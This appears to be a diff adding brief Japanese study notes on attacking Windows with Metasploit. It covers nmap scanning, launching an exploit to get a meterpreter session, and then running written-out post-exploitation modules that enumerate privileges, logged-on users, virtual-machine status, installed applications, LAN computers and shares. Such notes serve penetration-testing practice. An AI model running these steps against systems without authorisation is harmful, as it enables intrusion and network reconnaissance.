@@ -1,0 +1,41 @@
+windowsエクスプロイト
+1) nmap 
+2) msfconsole
+3) searchでエクスプロイトの検索
+4) use でモジュールの起動
+5) set で設定
+6) meterpreterの権限を奪う
+この後、metasploitを用いて、post exploitationの自動化を行う
+7) background
+
+8) 現在のユーザー権限の列挙を自動化するために使用できる
+use post/windows/gather/win_privs
+set SESSION 1
+run
+
+9) 現在および過去にログインしたユーザーのリストを列挙できる
+use post/windows/gather/enum_logged_on_users
+set SESSION 1
+run
+
+10) checkvmというモジュールを利用することで、ターゲットシステムが仮想マシンであるかどうかを確認することもできます。
+use post/windows/gather/checkvm
+set SESSION 1
+run
+
+11) このモジュールは、ターゲットシステムにインストールされているアプリケーション/プログラムのリストを列挙します。
+use post/windows/gather/enum_applications
+set SESSION 1
+run
+
+12) enum_computersモジュールを使用すると、ターゲットと同じLANに接続されているコンピューターのリストを列挙できます。
+use post/windows/gather/enum_computers
+set SESSION 1
+run
+
+13) enum_sharesモジュールを使って共有リストを列挙することもできます
+use post/windows/gather/enum_shares
+set SESSION 1
+run
+
+14) 
